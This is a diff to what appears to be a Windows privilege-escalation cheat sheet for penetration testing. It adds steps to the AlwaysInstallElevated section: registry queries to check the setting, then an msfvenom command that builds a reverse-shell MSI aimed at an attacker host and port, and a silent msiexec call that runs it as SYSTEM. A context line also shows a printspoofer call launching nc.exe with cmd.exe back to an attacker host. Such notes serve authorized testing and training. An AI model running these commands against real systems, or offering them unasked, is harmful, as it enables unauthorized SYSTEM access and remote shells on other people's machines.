@@ -919,6 +919,8 @@ cmd> printspoofer.exe -c "C:\temp\nc.exe [LHOST] [LPORT] -e cmd.exe"
 ### AlwaysInstallElevated
 
 If these 2 registers are enabled (value is 0x1), users of any privilege can install (execute) .msi files as NT AUTHORITY\SYSTEM.
+
+STEP 1: Check registers
 ```
 # OPTION 1:
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -927,6 +929,15 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 # OPTION 2:
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+```
+
+STEP 2: Exploit
+```
+# generate MSI payload in Kali
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[] LPORT=[] -f msi > rshell.msi
+
+# upload to target then execute
+cmd> msiexec /quiet /qn /i C:\temp\rshell.msi
 ```
 
 
